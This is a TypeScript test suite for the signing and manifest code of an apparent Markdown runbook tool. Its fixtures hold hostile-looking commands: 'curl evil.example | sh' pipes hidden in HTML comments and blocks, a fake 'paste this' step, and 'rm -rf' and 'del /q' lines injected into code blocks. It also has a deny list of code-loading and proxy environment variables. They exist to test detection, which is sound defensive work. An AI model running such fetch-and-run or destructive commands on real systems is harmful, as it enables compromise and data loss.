import { strict as assert } from 'node:assert';
import { describe, it } from 'node:test';
import { renderMarkdown, setCellOutput, DEFAULT_WRITE_OPTIONS } from '@md-runbook/core';
import { lintRunbook } from '@md-runbook/core/lint';
import {
  ManifestMeta,
  SignatureBlock,
  armorSignature,
  buildManifest,
  formatManifest,
  fromBase64,
  isReservedVar,
  parseManifest,
  readSignature,
  signedStatus,
  signedStepIndex,
  signedText,
  signedTextHash,
  toBase64,
  unarmorSignature,
  withSignature,
  withoutSignature,
} from '@md-runbook/core/signing';
import { roundTrip } from './helpers';

const fence = (info: string, body: string): string => '```' + info + '\n' + body + '\n```\n\n';
const meta = (m: Partial<ManifestMeta> = {}): ManifestMeta => ({ name: 'ops/restart', version: 3, scopes: ['web'], patterns: {}, ...m });
const errorsOf = (text: string, m: Partial<ManifestMeta> = {}): string[] => {
  const r = buildManifest(text, meta(m));
  return 'errors' in r ? r.errors : [];
};
const manifestOf = (text: string, m: Partial<ManifestMeta> = {}): string => {
  const r = buildManifest(text, meta(m));
  if ('errors' in r) throw new Error(r.errors.join('; '));
  return formatManifest(r.manifest);
};
const SIG = 'U1NIU0lHAAAAAQ' + 'A'.repeat(150);
const sign = (text: string, m: Partial<ManifestMeta> = {}): string =>
  withSignature(text, { signer: 'ops@example.net', signed: '2026-10-22', manifest: manifestOf(text, m), signature: SIG });

const RUNBOOK =
  '# Restart\n\n- [ ] Check first\n\n' +
  fence('bash name="status"', 'systemctl status api') +
  fence('bash lines=any cwd=/srv env.MODE=fast', 'echo one\nif true; then\n  echo two\nfi\necho "${param:TARGET}"') +
  fence('powershell', 'Get-Date') +
  fence('json', '{ "not": "a cell" }');

describe('signing: base64', () => {
  it('round-trips UTF-8 text and refuses anything that is not canonical base64', () => {
    for (const s of ['', 'a', 'ab', 'abc', 'Grüße 🚀\nline', '\u0000x']) assert.equal(fromBase64(toBase64(s)), s);
    assert.equal(toBase64('hi'), Buffer.from('hi').toString('base64'));
    for (const bad of ['a', 'ab=', '****', 'aGk=aGk=', '/w==']) assert.equal(fromBase64(bad), undefined, bad);
  });
});

describe('signing: the manifest', () => {
  it('holds each bash cell as the gate runs it: params rewritten, cwd, env, commands', () => {
    const m = parseManifest(manifestOf(RUNBOOK, { patterns: { TARGET: '[a-z]+', UNUSED: 'x' }, expires: '2027-01-31' }));
    assert.deepEqual([m.name, m.version, m.expires, m.scopes, m.patterns], ['ops/restart', 3, '2027-01-31', ['web'], { TARGET: '[a-z]+' }]);
    assert.equal(m.cells.length, 2, 'only the bash cells');
    const [a, b] = m.cells;
    assert.deepEqual(a, { n: 1, lines: 'all', info: 'bash name="status"', code: 'systemctl status api', needs: [], env: {}, steps: ['systemctl status api'] });
    assert.equal(b!.lines, 'any');
    assert.equal(b!.code, 'echo one\nif true; then\n  echo two\nfi\necho "${TARGET}"');
    assert.deepEqual([b!.cwd, b!.env, b!.needs], ['/srv', { MODE: 'fast' }, ['TARGET']]);
    assert.deepEqual(b!.steps, ['echo one', 'if true; then\n  echo two\nfi', 'echo "${TARGET}"']);
  });

  it('is plain lines, one item each, so the gate reads it with awk', () => {
    const runbook = fence('bash', 'echo hi');
    const text = manifestOf(runbook, { scopes: ['web', 'staging'] });
    // Version 2: the whole text's hash, as a key of its own (the gate reads items by key).
    const hash = signedTextHash(runbook);
    assert.equal(text, `md-runbook-manifest 1\nname ops/restart\nversion 3\nscope web staging\ntext ${hash}\ncell 1 all\ninfo YmFzaA==\ncode ZWNobyBoaQ==\nstep ZWNobyBoaQ==\nend\n`);
    // Version 1, as signed before (and co-signed as it was): byte for byte what it always was.
    const v1 = buildManifest(runbook, meta({ scopes: ['web', 'staging'] }), { version: 1 });
    assert.ok(!('errors' in v1));
    if (!('errors' in v1)) assert.equal(formatManifest(v1.manifest), 'md-runbook-manifest 1\nname ops/restart\nversion 3\nscope web staging\ncell 1 all\ninfo YmFzaA==\ncode ZWNobyBoaQ==\nstep ZWNobyBoaQ==\nend\n');
  });

  it('refuses what the gate could not hold to its signature', () => {
    const errs = errorsOf(
      fence('bash timeout=x', 'echo') +
        fence('bash', 'echo ${secret:TOKEN} ${out:POD} ${input:WHO}') +
        fence('bash', 'echo ${param:NOPAT}') +
        fence('bash env.A=${param:X}', 'echo'),
      { name: 'bad name!', version: 0, expires: 'soon', scopes: ['a b'] },
    );
    const all = errs.join('\n');
    for (const re of [
      /name "bad name!"/,
      /version 0/,
      /expires soon/,
      /scope "a b"/,
      /cell 1 .*invalid option timeout=x/,
      /cell 2 .*\$\{secret:TOKEN\} can't be signed/,
      /cell 2 .*\$\{out:POD\} needs a pattern/,
      /cell 2 .*\$\{input:WHO\} needs a pattern/,
      /cell 3 .*\$\{param:NOPAT\} needs a pattern/,
      /cell 4 .*env.A can't use placeholders/,
    ])
      assert.match(all, re);
    assert.deepEqual(errorsOf('# only prose\n\n' + fence('pwsh', 'Get-Date')), ['no bash or sh cells to sign']);
    // The gate runs bash; the front matter isn't signed.
    assert.match(errorsOf('---\nshell: zsh\n---\n\n' + fence('bash', 'echo')).join('\n'), /front matter shell: zsh: servers run signed runbooks in bash/);
    assert.equal(errorsOf('---\nshell: bash, pwsh\n---\n\n' + fence('bash', 'echo')).length, 0);
  });

  it('signs ${input:} and ${out:} with a pattern, like parameters; never secrets (servers log the values)', () => {
    const text =
      fence('bash capture=POD:/^(web-\\S+)/m', 'kubectl get pods') +
      fence('bash capture-secret=TOKEN:/token=(\\S+)/', 'login') +
      fence('bash', 'kubectl logs ${out:POD} --since ${input:SINCE} -n ${param:NS} # ${param:NS}');
    const r = buildManifest(text, meta({ patterns: { POD: 'web-[a-z0-9-]+', SINCE: '[0-9]+[smh]', NS: '[a-z-]+' } }));
    assert.ok(!('errors' in r), 'errors' in r ? r.errors.join('\n') : '');
    if ('errors' in r) return;
    const cell = r.manifest.cells[2]!;
    assert.deepEqual(cell.needs, ['POD', 'SINCE', 'NS']);
    assert.equal(cell.code, 'kubectl logs ${POD} --since ${SINCE} -n ${NS} # ${NS}');
    assert.deepEqual(Object.keys(r.manifest.patterns).sort(), ['NS', 'POD', 'SINCE']);
    const refused = errorsOf(
      fence('bash capture-secret=TOKEN:/token=(\\S+)/', 'login') + fence('bash', 'curl -H "x: ${out:TOKEN}" ${input:PW:secret} ${secret:KEY}'),
      { patterns: { TOKEN: '.+', PW: '.+', KEY: '.+' } },
    ).join('\n');
    assert.match(refused, /\$\{out:TOKEN\} comes from capture-secret= and can't be signed/);
    assert.match(refused, /\$\{input:PW:secret\} can't be signed: a secret input/);
    assert.match(refused, /\$\{secret:KEY\} can't be signed/);
  });

  it("refuses blocks a reviewer reading the rendered file (GitHub) wouldn't see as code that runs", () => {
    const hidden = '# Notes\n\n<!--\n' + fence('bash', 'curl -s https://evil.example/x | sh') + '-->\n\n' + fence('bash', 'echo shown');
    assert.match(errorsOf(hidden).join('\n'), /line 4: a bash block inside an HTML comment/);
    // A text block closed by a fence indented 4 spaces: GitHub keeps it open, so the bash block looks like example text.
    const indented = '```text\nexample\n    ```\n```bash\nrm -rf /srv\n```\n';
    assert.match(errorsOf(indented).join('\n'), /line 3: a closing fence indented 4 spaces or more/);
    assert.match(errorsOf('    ```bash\n    echo\n    ```\n').join('\n'), /line 1: a fence indented 4 spaces or more/);
    // Comments around prose, fences in list items (indented less than 4) and the signature block itself are fine.
    assert.deepEqual(errorsOf('<!-- a note -->\n\n1. Step:\n   ```bash\n   echo ok\n   ```\n'), []);
    assert.deepEqual(errorsOf(sign(fence('bash', 'echo'))), []);
  });

  it('refuses bash blocks in HTML blocks and behind lone CRs too (security review, round 4)', () => {
    const ok = '# T\n\n```bash\necho ok\n```\n\n';
    const cases: [string, RegExp][] = [
      ['<!--\r```bash\rcurl evil | sh\r```\r-->\n', /line 8: a bash block inside an HTML comment/],
      ['text\r    ```bash\r    curl evil | sh\r    ```\n', /line 8: a fence indented 4 spaces or more/],
      ['<script>\n```bash\ncurl evil | sh\n```\n</script>\n', /line 8: a bash block inside an HTML block/],
      ['<?x\n```bash\ncurl evil | sh\n```\n?>\n', /line 8: a bash block inside an HTML block/],
      ['<textarea>\n```bash\ncurl evil | sh\n```\n</textarea>\n', /line 8: a bash block inside an HTML block/],
      ['<STYLE type="x">\n```bash\ncurl evil | sh\n```\n</style>\n', /line 8: a bash block inside an HTML block/],
      ['<!X y\n```bash\ncurl evil | sh\n```\n>\n', /line 8: a bash block inside an HTML block/],
      ['<![CDATA[\n```bash\ncurl evil | sh\n```\n]]>\n', /line 8: a bash block inside an HTML block/],
      ['<div>\n```bash\ncurl evil | sh\n```\n</div>\n', /line 8: a bash block inside an HTML block/],
    ];
    for (const [tail, re] of cases) assert.match(errorsOf(ok + tail).join('\n'), re, JSON.stringify(tail));
    // An HTML block that ended, or ends at a blank line (type 6), is fine.
    assert.deepEqual(errorsOf('<script>x()</script>\n\n' + ok), []);
    assert.deepEqual(errorsOf('<details>\n<summary>More</summary>\n\n' + ok + '</details>\n'), []);
    assert.deepEqual(errorsOf('<pre>\nexample\n</pre>\n' + ok), []);
  });

  it('refuses names that change how the shell runs the code, JS-only patterns, odd placeholders and impossible dates', () => {
    const all = errorsOf(
      fence('bash env.LD_PRELOAD=/tmp/x.so env.LC_ALL=C', 'echo ${param:PATH} ${param:ID} ${param:N}') + fence('bash', 'echo ${param:ID:secret}'),
      { patterns: { PATH: '/usr/bin', ID: '\\d+', N: '[0-9]+?' }, expires: '2026-02-31' },
    ).join('\n');
    for (const re of [
      /expires 2026-02-31: expected a date/,
      /\$\{param:PATH\}: PATH can't be a parameter/,
      /pattern for ID: \\d\+ uses JavaScript-only syntax/,
      /pattern for N: \[0-9\]\+\? uses JavaScript-only syntax/,
      /cell 1 .*env\.LD_PRELOAD can't be set by a signed runbook/,
      /cell 1 .*env\.LC_ALL can't be set by a signed runbook/,
      /cell 2 .*\$\{param:ID:secret\} is not a plain \$\{param:NAME\}/,
    ])
      assert.match(all, re);
    assert.deepEqual(errorsOf(fence('bash env.MODE=fast', 'echo ${param:ID}'), { patterns: { ID: '[a-z][a-z0-9-]{0,30}|[0-9]{1,6}' }, expires: '2028-02-29' }), []);
  });

  it('refuses names that load code, or change where programs connect or what they trust (security review, 2026-11-16)', () => {
    const names = [
      'GCONV_PATH', 'LOCPATH', 'GLIBC_TUNABLES', 'NODE_OPTIONS', 'PYTHONPATH', 'PYTHONSTARTUP', 'PYTHONHOME', 'PERL5OPT', 'PERL5LIB',
      'RUBYOPT', 'RUBYLIB', 'JAVA_TOOL_OPTIONS', '_JAVA_OPTIONS', 'GIT_SSH_COMMAND', 'GIT_SSH', 'GIT_CONFIG_GLOBAL', 'GIT_CONFIG_SYSTEM',
      'GIT_CONFIG_COUNT', 'GIT_CONFIG_KEY_0', 'GIT_CONFIG_VALUE_12', 'BASH_COMPAT', 'BASH_XTRACEFD', 'HISTFILE', 'PROMPT_COMMAND',
      'http_proxy', 'https_proxy', 'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY', 'NO_PROXY', 'CURL_HOME', 'XDG_CONFIG_HOME',
      'SSL_CERT_FILE', 'SSL_CERT_DIR', 'NODE_EXTRA_CA_CERTS', 'REQUESTS_CA_BUNDLE',
    ];
    for (const n of names) assert.ok(isReservedVar(n), n);
    // env.KUBECONFIG picks the cluster, signed: a documented option.
    for (const n of ['KUBECONFIG', 'TARGET', 'GIT_BRANCH', 'PYTHON_VERSION', 'NODE_ENV']) assert.ok(!isReservedVar(n), n);
    const all = errorsOf(fence('bash env.NODE_OPTIONS=--require=/tmp/x.js', 'echo ${param:https_proxy}'), { patterns: { https_proxy: '.+' } }).join('\n');
    assert.match(all, /env\.NODE_OPTIONS can't be set by a signed runbook/);
    assert.match(all, /\$\{param:https_proxy\}: https_proxy can't be a parameter/);
  });

  it("signs the pattern of a block's kube-context=${param:NAME}, so the gate can check its value (security review, 2026-11-16)", () => {
    const text = fence('bash kube-context=${param:CTX}', 'kubectl get pods') + fence('bash kube-context=prod-eu', 'kubectl get nodes');
    const m = parseManifest(manifestOf(text, { patterns: { CTX: 'lab-[0-9]+|prod-eu', UNUSED: 'x' } }));
    assert.deepEqual(m.patterns, { CTX: 'lab-[0-9]+|prod-eu' });
    // Not a value the code uses: the cell still needs nothing.
    assert.deepEqual(m.cells[0]!.needs, []);
    assert.equal(m.cells[1]!.info, 'bash kube-context=prod-eu');
  });

  it('parseManifest refuses malformed and newer manifests', () => {
    assert.throws(() => parseManifest('md-runbook-manifest 2\nend\n'), /newer version/);
    assert.throws(() => parseManifest('md-runbook-manifest 1\nname x\nversion 1\n'), /no end/);
    assert.throws(() => parseManifest('md-runbook-manifest 1\nname x\nversion 1\ncode !!\nend\n'), /bad code|outside a cell/);
    assert.throws(() => parseManifest('md-runbook-manifest 1\nname x\nversion 1\nwhat 1\nend\n'), /unknown item/);
    // md-runbook-gate reads the first of these: a second one is refused, not taken (security review, 2026-11-16).
    assert.throws(() => parseManifest('md-runbook-manifest 1\nname x\nversion 1\nversion 9\nend\n'), /more than one version line/);
    assert.throws(() => parseManifest('md-runbook-manifest 1\nname x\nname y\nversion 1\nend\n'), /more than one name line/);
    assert.throws(() => parseManifest('md-runbook-manifest 1\nname x\nversion 1\nexpires soon\nend\n'), /bad expires/);
    assert.equal(parseManifest('md-runbook-manifest 1\nname x\nversion 1\nexpires 2027-01-31\nend\n').expires, '2027-01-31');
    assert.throws(() => parseManifest('md-runbook-manifest 1\nname x\nversion 1\nexpires 2027-13-45\nend\n'), /bad expires/);
    for (const v of ['0x10', '1e3', '007', '0', '1234567'])
      assert.throws(() => parseManifest(`md-runbook-manifest 1\nname x\nversion ${v}\nend\n`), /bad version/, v);
  });
});

describe('signing: the signature block', () => {
  it('goes at the end, replaces an earlier one, and comes off again without a trace', () => {
    const signed = sign(RUNBOOK, { patterns: { TARGET: '.+' } });
    assert.ok(signed.startsWith(RUNBOOK.trimEnd() + '\n\n<!-- md-runbook:signature v1 signer=ops@example.net signed=2026-10-22\nmanifest\n'));
    assert.ok(signed.endsWith('\n-->\n'));
    const again = sign(signed, { patterns: { TARGET: '.+' }, version: 4 });
    assert.equal(again.match(/md-runbook:signature/g)?.length, 1);
    assert.equal(parseManifest(readSignature(again)!.manifest).version, 4);
    assert.equal(withoutSignature(signed), RUNBOOK.trimEnd() + '\n');
    // CRLF files keep CRLF.
    const crlf = sign(fence('bash', 'echo hi').replace(/\n/g, '\r\n'));
    assert.ok(!/[^\r]\n/.test(crlf), 'only CRLF');
    assert.equal(readSignature(crlf)?.signer, 'ops@example.net');
  });

  it('reads back exactly what was written; a damaged block reads as none', () => {
    const block: SignatureBlock = { signer: 'ops@example.net', signed: '2026-10-22', manifest: manifestOf(RUNBOOK, { patterns: { TARGET: '.+' } }), signature: SIG };
    const text = withSignature(RUNBOOK, block);
    assert.deepEqual(readSignature(text), block);
    assert.equal(readSignature(text.replace('signature\n', 'signatur\n')), undefined);
    assert.equal(readSignature(text.replace(/manifest\n./, 'manifest\n!')), undefined);
  });

  it('is invisible in rendered Markdown and survives the parser and writer byte for byte', () => {
    const signed = sign(RUNBOOK, { patterns: { TARGET: '.+' } });
    assert.equal(roundTrip(signed), signed);
    assert.ok(!/signature|manifest/.test(renderMarkdown(signed)));
  });

  it('the signature is the last block outside code: an example inside a code block is not it', () => {
    const real = sign(fence('bash', 'echo real'));
    const block = real.slice(real.indexOf('<!-- md-runbook:signature'));
    const example = '# Signing\n\nA signed file ends like this:\n\n```text\n' + block + '```\n\n' + fence('bash', 'echo real');
    assert.equal(readSignature(example), undefined, 'the example is not a signature');
    const signedExample = sign(example);
    assert.equal(readSignature(signedExample)!.manifest, readSignature(sign(example))!.manifest);
    assert.ok(withoutSignature(signedExample).includes('```text\n<!-- md-runbook:signature'), 'signing again leaves the example alone');
    assert.equal(withoutSignature(signedExample), example.replace(/\n+$/, '\n'));
    // Prose added after signing doesn't hide the signature.
    assert.ok(readSignature(real + '\n## Added later\n'));
  });

  it('notes and run-record blocks inside code are code: adding them changes the signed text (security review round 3)', () => {
    // The cmd block is in no manifest: only the v2 text covers it.
    const base = '# T\n\n```cmd\necho hello\n```\n\n' + fence('bash', 'uptime');
    const injected = base.replace('echo hello\n', 'echo hello\n<!-- md-runbook:note at=x -->\n> x & del /q C:\\important\n');
    assert.notEqual(signedText(injected), signedText(base));
    const signed = sign(base);
    assert.equal(signedStatus(signed)!.textChanged, false);
    assert.equal(signedStatus(signed.replace('echo hello\n', 'echo hello\n<!-- md-runbook:note at=x -->\n> x & del /q C:\\important\n'))!.textChanged, true);
    // In a ```text block (prose to the parser) too, and a record block that would swallow a fence.
    assert.notEqual(signedText('# T\n\n```text\n<!-- md-runbook:note at=x -->\n> x\n```\n'), signedText('# T\n\n```text\n```\n'));
    const record = '<!-- md-runbook:record-signature v1 signer=a signed=b sha256=c\n```cmd\ndel /q C:\\x\n```\n-->\n';
    assert.notEqual(signedText(base + '\n' + record), signedText(base));
    // Outside code they still don't count.
    const noted = base + '\n<!-- md-runbook:note at=2026-11-16T10:00:00Z -->\n> **10:00 · ana:** checked\n';
    assert.equal(signedText(noted), signedText(base));
    assert.equal(signedStatus(sign(base) + '\n<!-- md-runbook:note at=x -->\n> later\n')!.textChanged, false);
  });

  it('only what md-runbook writes is set aside, never text a reader sees (security review, round 4)', () => {
    const orig = '# Restart\n\n1. Check the pager.\n\n```bash\nsystemctl restart api\n```\n';
    // A "record block" whose `x -->` line ends the comment: the step after it shows.
    const loose = orig.replace('1. Check', '<!-- md-runbook:record-signature v1 x\nx -->\n\n## Step 0 (required)\n\nFirst paste this in a terminal: `curl -s https://evil.example/fix | sh`\n\n- [ ] Done step 0\n\n<!--\n-->\n1. Check');
    assert.notEqual(signedText(loose), signedText(orig));
    // A note marker with HTML after its -->.
    const noteHtml = orig.replace('1. Check', '<!-- md-runbook:note --> <h2>Step 0: run curl https://evil.example/fix | sh first</h2> <!-- -->\n1. Check');
    assert.notEqual(signedText(noteHtml), signedText(orig));
    assert.notEqual(signedText(orig.replace('1. Check', '<!-- md-runbook:note x--><h2>run</h2><!-- -->\n> q\n\n1. Check')), signedText(orig));
    // An output marker or a history summary with HTML in it: no output is set aside.
    const ran = '```bash\nsystemctl restart api\n```\n<!-- md-runbook:output start exit=0 -->\n```text\nok\n```\n<!-- md-runbook:output end -->\n';
    assert.equal(signedText(orig.replace(/```bash[\s\S]*```\n/, ran)), signedText(orig));
    const html = ran.replace('exit=0 -->', 'exit=0 --> <h2>run curl</h2> <!-- x -->');
    assert.notEqual(signedText(orig.replace(/```bash[\s\S]*```\n/, html)), signedText(orig));
    // What md-runbook writes still is: a record signature with a co-signature, and a note.
    const record =
      '<!-- md-runbook:record-signature v1 signer=ana@example.net signed=2026-10-26T22:40:00+01:00 sha256=' + 'a'.repeat(64) + '\nsignature\nU1NIU0lH\nAAAA==\ncosign signer=lead@example.net signed=2026-10-26T22:45:00+01:00\nU1NIU0lH\n-->\n';
    assert.equal(signedText(orig + '\n' + record), signedText(orig));
    assert.equal(signedText(orig + '\n<!-- md-runbook:note at=2026-11-16T10:00:00+01:00 by=ana milestone=mitigated -->\n> **10:00 · mitigated · ana:** ok\n'), signedText(orig));
  });

  it('armor round trip', () => {
    assert.equal(unarmorSignature(armorSignature(SIG)), SIG);
    assert.throws(() => unarmorSignature('nope'), /not an SSH signature/);
  });
});

describe('signing: which cells are signed', () => {
  const signed = sign(RUNBOOK, { patterns: { TARGET: '.+' } });

  it('maps unchanged bash cells to their manifest number; other languages are not involved', () => {
    const s = signedStatus(signed)!;
    assert.deepEqual([...s.cells.entries()].map(([i, c]) => [i, c.n, c.lines, c.needs]), [
      [1, 1, 'all', []],
      [2, 2, 'any', ['TARGET']],
    ]);
    assert.deepEqual(s.changed, []);
    assert.equal(signedStatus(RUNBOOK), undefined);
  });

  it('outputs, ticked boxes and moved cells keep a cell signed; edited code or options do not', () => {
    const ran = setCellOutput(signed.replace('- [ ] Check', '- [x] Check'), 1, { kind: 'new', text: 'active', attrs: { exit: '0' } }, DEFAULT_WRITE_OPTIONS)!;
    assert.deepEqual(signedStatus(ran)!.changed, []);
    const edited = signed.replace('systemctl status api', 'systemctl restart api');
    assert.deepEqual(signedStatus(edited)!.changed, [1]);
    const option = signed.replace('bash name="status"', 'bash name="status" timeout=5');
    assert.deepEqual(signedStatus(option)!.changed, [1]);
    const added = signed.replace('# Restart\n', '# Restart\n\n' + fence('bash', 'echo new'));
    const s = signedStatus(added)!;
    assert.deepEqual(s.changed, [1]);
    // Cells: heading, the new block, the task list, the signed block.
    assert.equal(s.cells.get(3)?.n, 1, 'the signed cell after the new one is still cell 1');
  });

  it('reports signed blocks deleted or moved since signing (they still match, but the order was reviewed)', () => {
    const three = sign(fence('bash', 'cd /srv/app/tmp') + fence('bash', 'rm -rf ./*') + fence('bash', 'cd /srv/app'));
    const s = signedStatus(three)!;
    assert.deepEqual([s.changed, s.missing, s.moved], [[], [], []]);
    // Swap the two cd blocks around the rm: every block still matches by content.
    const swapped = three.replace('cd /srv/app/tmp', 'cd /srv/app/__x').replace(/cd \/srv\/app\n/, 'cd /srv/app/tmp\n').replace('cd /srv/app/__x', 'cd /srv/app');
    const w = signedStatus(swapped)!;
    assert.deepEqual([w.changed, w.missing, w.moved], [[], [], [1, 2]]);
    assert.match(lintRunbook(swapped).map((p) => p.message).join('\n'), /block moved since the runbook was signed: it was signed as block 2/);
    // Delete two of the three blocks.
    const cut = three.replace(fence('bash', 'cd /srv/app/tmp'), '').replace(fence('bash', 'cd /srv/app'), '');
    const d = signedStatus(cut)!;
    assert.deepEqual([d.changed, d.missing], [[], [1, 3]]);
    assert.match(lintRunbook(cut).map((p) => p.message).join('\n'), /signed blocks 1, 3 of 3 not in the file as signed/);
  });

  it('lint: env: in a signed runbook is for VS Code and the command line only (the front matter is not signed)', () => {
    const signedRb = sign(fence('bash', 'echo hi'));
    const withEnv = lintRunbook('---\nenv:\n  PAGER: cat\n---\n\n' + signedRb);
    const w = withEnv.find((p) => /front matter env: is used in VS Code and the command line only/.test(p.message));
    assert.ok(w, withEnv.map((p) => p.message).join('\n'));
    assert.equal(w.line, 1);
    const unsigned = lintRunbook('---\nenv:\n  PAGER: cat\n---\n\n' + fence('bash', 'echo hi'));
    assert.doesNotMatch(unsigned.map((p) => p.message).join('\n'), /VS Code and the command line only/);
  });

  it('lint warns when shell: zsh is added to a signed runbook (the front matter is not signed)', () => {
    const signedRb = sign(fence('bash', 'echo hi'));
    assert.doesNotMatch(lintRunbook(signedRb).map((p) => p.message).join('\n'), /shell:/);
    const ps = lintRunbook('---\nshell: zsh\n---\n\n' + signedRb);
    const w = ps.find((p) => /shell: zsh in a signed runbook/.test(p.message));
    assert.ok(w, ps.map((p) => p.message).join('\n'));
    assert.equal(w.line, 1);
  });

  it('finds the signed command of a line run by its text', () => {
    const cell = signedStatus(signed)!.cells.get(2)!;
    assert.equal(signedStepIndex(cell, 'echo "${param:TARGET}"'), 2);
    assert.equal(signedStepIndex(cell, 'if true; then\n  echo two\nfi'), 1);
    assert.equal(signedStepIndex(cell, 'echo three'), -1);
    // A repeated command: its position decides (else the gate gets the first one, out of order).
    const twice = signedStatus(sign(fence('bash', 'sleep 5\necho one\nsleep 5')))!.cells.get(0)!;
    assert.equal(signedStepIndex(twice, 'sleep 5', 2), 2);
    assert.equal(signedStepIndex(twice, 'sleep 5'), 0);
    assert.equal(signedStepIndex(twice, 'sleep 5', 1), 0, 'a wrong position falls back to the text');
  });

  it('lint: blocks changed since signing, a damaged block, and host=/lines= are known options', () => {
    const edited = signed.replace('systemctl status api', 'systemctl restart api');
    assert.match(lintRunbook(edited).map((p) => p.message).join('\n'), /block changed since the runbook was signed/);
    assert.match(lintRunbook(signed.replace('signature\n', 'signatur\n')).map((p) => p.message).join('\n'), /signature block is damaged/);
    // An example of a block inside code is not the signature: no error.
    const example = '# Doc\n\n```\n<!-- md-runbook:signature v1 signer=ops@example.net signed=2026-10-22\nmanifest\nAAAA…\n```\n';
    assert.doesNotMatch(lintRunbook(example).map((p) => p.message).join('\n'), /damaged/);
    assert.deepEqual(lintRunbook(fence('bash host=web lines=any', 'echo')), []);
    assert.match(lintRunbook(fence('bash lines=some', 'echo'))[0]!.message, /lines=some: expected lines=any/);
  });
});
